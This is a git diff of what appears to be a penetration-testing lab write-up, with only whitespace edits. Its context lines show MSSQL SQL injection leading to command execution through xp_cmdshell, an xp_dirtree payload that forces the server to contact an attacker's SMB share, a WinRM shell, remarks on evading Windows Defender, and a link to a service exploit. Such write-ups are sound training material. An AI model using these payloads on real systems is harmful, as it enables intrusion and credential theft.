@@ -17,7 +17,7 @@ PORT     STATE SERVICE
 5985/tcp open  wsman
 ```
 
-Both RDP and WinRM are accessible on this machine, which is new.&#x20;
+Both RDP and WinRM are accessible on this machine, which is new.
 
 ### SQLI -> Stacy Shell
 
@@ -65,7 +65,7 @@ If we replace the number with a `'` character, a lot of SQL errors are returned:
 
 <figure><img src="../../../.gitbook/assets/image (4084).png" alt=""><figcaption></figcaption></figure>
 
-This is vulnerable to SQL injection. Googling any of the errors here reveals that this is MSSQL, which we can actually get RCE from through `xp_cmdshell`.&#x20;
+This is vulnerable to SQL injection. Googling any of the errors here reveals that this is MSSQL, which we can actually get RCE from through `xp_cmdshell`.
 
 ```sql
 2; EXEC master ..xp_dirtree '\\10.10.14.13\share'; --
@@ -114,7 +114,7 @@ Mode                LastWriteTime         Length Name
 stop
 ```
 
-Also, we can enumerate and see that Windows Defender is enabled for this machine, meaning any payload we use has to be obfuscated and encoded.&#x20;
+Also, we can enumerate and see that Windows Defender is enabled for this machine, meaning any payload we use has to be obfuscated and encoded.
 
 ```
 *Evil-WinRM* PS C:\Users\Stacy\documents> cmd.exe /c "sc query windefend"
@@ -141,7 +141,7 @@ whoami
 Get-Service -ServiceName UniFiVideoService
 ```
 
-Now we can exploit this.&#x20;
+Now we can exploit this.
 
 {% embed url="https://www.exploit-db.com/exploits/43390" %}
 
